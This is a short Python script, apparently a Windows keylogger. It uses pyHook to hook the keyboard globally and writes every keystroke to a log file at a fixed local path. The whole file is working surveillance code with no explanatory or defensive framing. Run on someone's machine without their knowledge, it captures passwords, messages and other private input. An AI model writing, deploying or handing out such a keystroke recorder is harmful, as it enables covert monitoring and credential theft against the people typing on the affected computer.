import pyHook
import sys
import logging
import pythoncom


file_log ='D:\sankar\log.txt'
open(file_log,"a")
def onKeyBoardEvent(event):
    logging.basicConfig(filename=file_log,level = logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hm = pyHook.HookManager()
hm.KeyDown = onKeyBoardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
